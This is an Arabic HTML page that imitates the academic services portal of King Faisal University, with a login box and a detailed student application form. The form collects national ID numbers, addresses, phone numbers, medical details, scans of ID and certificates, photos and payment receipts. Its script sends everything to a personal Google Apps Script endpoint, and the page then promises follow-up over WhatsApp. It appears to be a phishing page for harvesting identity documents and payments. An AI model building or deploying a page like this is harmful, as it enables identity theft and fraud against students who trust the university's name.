<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
<meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
<meta property="og:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">
<link rel="icon" type="image/png" href="kfu_logo.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root {
  --uf-green: #0b6b44;
  --gold: #d4af37;
  --bg: #f5f6f8;
  --card: #fff;
  --muted: #555;
}
* {box-sizing:border-box;}
body {
  margin:0;
  font-family:"Cairo","Segoe UI",Tahoma,sans-serif;
  background: var(--bg);
  color:#222;
}
a {text-decoration:none; color:inherit;}
.login-container {
  max-width:450px;
  margin:50px auto;
  background: var(--card);
  border-radius:14px;
  box-shadow:0 10px 30px rgba(0,0,0,0.1);
  overflow:hidden;
  text-align:center;
  padding:30px 20px;
}
.logo-circle {
  width:100px;
  height:100px;
  border-radius:50%;
  background:linear-gradient(135deg,var(--uf-green),#064b33);
  margin:0 auto 15px;
  display:flex;
  align-items:center;
  justify-content:center;
}
.logo-circle img {width:60px; height:60px;}
h1 {margin:0; color:var(--uf-green);}
.login-form {margin-top:20px; text-align:right;}
.form-group {margin-bottom:15px; text-align:right;}
.form-group label {display:block; font-weight:600; margin-bottom:6px;}
.form-group input, .form-group select {width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;}
.login-btn {
  width:100%; padding:12px; background: linear-gradient(135deg,var(--uf-green),var(--gold));
  color:#fff; font-weight:700; border:none; border-radius:10px; cursor:pointer; font-size:16px;
  display:flex; justify-content:center; align-items:center; gap:10px;
}
.quick-access {margin-top:20px; text-align:center;}
.quick-link {
  display:inline-flex; align-items:center; gap:8px;
  padding:10px 15px; background:var(--uf-green); color:#fff; border-radius:8px; margin:5px;
  cursor:pointer;
}
.container-form {
  max-width:900px; margin:30px auto; background:var(--card); border-radius:14px;
  padding:30px 40px; display:none; box-shadow:0 10px 30px rgba(0,0,0,0.1);
}
.container-form header {display:flex; align-items:center; gap:20px; margin-bottom:20px; flex-wrap:wrap;}
.container-form .logo {width:60px; height:60px; border-radius:10px; background:var(--uf-green); color:#fff; display:flex; align-items:center; justify-content:center; font-weight:700;}
.container-form h1 {margin:0; color:var(--uf-green);}
.container-form .subtitle {color:var(--muted); margin:0; font-size:14px;}
.grid2 {display:grid; grid-template-columns:1fr 1fr; gap:25px;}
label {font-weight:600; margin-bottom:6px; display:block;}
input, select, textarea {width:100%; padding:10px; border-radius:8px; border:1px solid #ccc; font-size:14px;}
textarea {min-height:80px;}
.submit-area {text-align:center; margin-top:20px; display:flex; justify-content:center; gap:10px;}
.btn {background:var(--uf-green); color:#fff; border:none; padding:12px 30px; border-radius:10px; cursor:pointer; font-weight:700;}
.btn.cancel {background:#aaa;}
#toast {
  position:fixed; top:20px; right:20px; background:var(--uf-green); color:#fff;
  padding:12px 18px; border-radius:8px; opacity:0; transform:translateY(-10px); transition:all .4s ease; z-index:9999;
}
#toast.show {opacity:1; transform:translateY(0);}
@media(max-width:900px) {.grid2 {grid-template-columns:1fr;}}
.payment-section {display:none; max-width:500px; margin:30px auto; background:#fff; padding:20px; border-radius:14px; text-align:center; box-shadow:0 8px 20px rgba(0,0,0,0.08);}
.payment-section h2 {color:var(--uf-green);}
</style>
</head>
<body>

<!-- الصفحة الرئيسية -->
<div class="login-container">
  <div class="logo-circle">
    <img src="kfu_logo.png" alt="شعار جامعة الملك فيصل">
  </div>
  <h1>جامعة الملك فيصل</h1>
  <p>بوابة الخدمات الأكاديمية</p>

  <div class="login-form">
    <h2>تسجيل الدخول</h2>
    <form>
      <div class="form-group">
        <label>اسم المستخدم أو الإيميل</label>
        <input type="text" required>
      </div>
      <div class="form-group">
        <label>كلمة المرور</label>
        <input type="password" required>
      </div>
      <button type="submit" class="login-btn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
    </form>
  </div>

  <div class="quick-access">
    <h3>وصول سريع</h3>
    <div class="quick-links">
      <div class="quick-link" onclick="showForm()"><i class="fas fa-user-graduate"></i> تقديم طلب جديد</div>
    </div>
  </div>
</div>

<!-- نموذج التسجيل -->
<div class="container-form" id="registrationForm">
  <header>
    <div class="logo">KFU</div>
    <div>
      <h1>نموذج التسجيل - جامعة الملك فيصل</h1>
      <p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
    </div>
  </header>
  <form id="registrationFormForm" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec" method="POST" enctype="multipart/form-data">
    <div class="grid2">
      <div>
        <label>الاسم الكامل (رباعي) *</label>
        <input type="text" name="fullName" required>
        <label>الجنس *</label>
        <select name="gender" required>
          <option value="">اختر...</option><option>ذكر</option><option>أنثى</option>
        </select>
        <label>الجنسية *</label>
        <select name="nationality" required>
          <option value="">اختر...</option><option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option>
        </select>
        <label>الدولة *</label>
        <select name="country" required>
          <option value="">اختر...</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option>
        </select>
        <label>رقم الهوية / الإقامة *</label>
        <input type="text" name="idNumber" required>
        <label>تاريخ الميلاد *</label>
        <input type="date" name="birthDate" required>
        <label>المدينة *</label>
        <input type="text" name="city" required>
        <label>العنوان *</label>
        <textarea name="address" required></textarea>
        <label>رقم الجوال (واتساب) *</label>
        <input type="tel" name="phone" required>
        <label>البريد الإلكتروني *</label>
        <input type="email" name="email" required>
      </div>
      <div>
        <label>نوع المؤهل السابق *</label>
        <select name="prevDegree" required>
          <option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option>
        </select>
        <label>سنة التخرج *</label>
        <input type="number" name="gradYear" min="1900" max="2100" required>
        <label>اسم المدرسة / الجامعة السابقة</label>
        <input type="text" name="prevInstitute">
        <label>المعدل</label>
        <input type="text" name="gpa">
        <label>التخصص المطلوب *</label>
        <input type="text" name="desiredMajor" required>
        <label>نوع الدراسة *</label>
        <select name="studyType" required>
          <option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option>
        </select>
        <label>الكلية / القسم *</label>
        <select name="faculty" required>
          <option value="">اختر...</option><option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option></select>
        <label>حالة طبية هامة (إن وُجد)</label>
        <input type="text" name="medicalInfo">
        <div style="margin-top:12px">جهة الاتصال للطوارئ</div>
        <label>اسم جهة الاتصال</label>
        <input type="text" name="emergencyName">
        <label>صلة القرابة</label>
        <input type="text" name="emergencyRelation">
        <label>رقم الطوارئ</label>
        <input type="tel" name="emergencyPhone">
      </div>
    </div>

    <div style="margin-top:18px">
      <div>المرفقات المطلوبة</div>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:8px;">
        <div>
          <label>صورة الهوية / الإقامة *</label>
          <input type="file" name="fileId" accept="image/*,application/pdf" required>
        </div>
        <div>
          <label>صورة الشهادة / المؤهل *</label>
          <input type="file" name="fileCertificate" accept="image/*,application/pdf" required>
        </div>
      </div>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:12px;">
        <div>
          <label>صورة شخصية *</label>
          <input type="file" name="filePhoto" accept="image/*" required>
        </div>
        <div>
          <label>إيصال الدفع</label>
          <input type="file" name="fileReceipt" accept="image/*,application/pdf">
        </div>
      </div>
    </div>

    <div style="margin-top:16px">
      <label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة.</label>
    </div>

    <div class="submit-area">
      <button type="submit" class="btn">إرسال الطلب</button>
      <button type="reset" class="btn cancel">إلغاء</button>
    </div>
  </form>
</div>

<!-- قسم الدفع بعد الإرسال -->
<div class="payment-section" id="paymentSection">
  <h2>تم استلام البيانات بنجاح ✅</h2>
  <p>سيتم التواصل معك عبر الواتساب أو البريد الإلكتروني لإرسال الرقم الجامعي.</p>
</div>

<div id="toast"></div>

<script>
function showForm(){
  document.getElementById('registrationForm').style.display='block';
  window.scrollTo({top:0,behavior:'smooth'});
}

function showToast(msg){
  const toast=document.getElementById('toast');
  toast.textContent=msg;
  toast.classList.add('show');
  setTimeout(()=>toast.classList.remove('show'),2500);
}

document.getElementById('registrationFormForm').addEventListener('submit', function(e){
  e.preventDefault();
  const form=this;
  // تحقق من الحقول المطلوبة
  let valid=true;
  form.querySelectorAll('[required]').forEach(input=>{
    if(!input.value) valid=false;
  });
  if(!valid){ showToast('❌ الرجاء تعبئة جميع الحقول المطلوبة'); return; }

  const fd=new FormData(this);
  fetch(form.action,{method:'POST', body:fd})
  .then(res=>{
    if(res.ok){
      showToast('✅ تم إرسال الطلب بنجاح');
      form.reset();
      form.style.display='none';
      document.getElementById('paymentSection').style.display='block';
      window.scrollTo({top:0,behavior:'smooth'});
    } else {showToast('❌ حدث خطأ حاول لاحقاً');}
  })
  .catch(()=>showToast('❌ فشل الاتصال، تحقق من الإنترنت'));
});
</script>

</body>
</html>
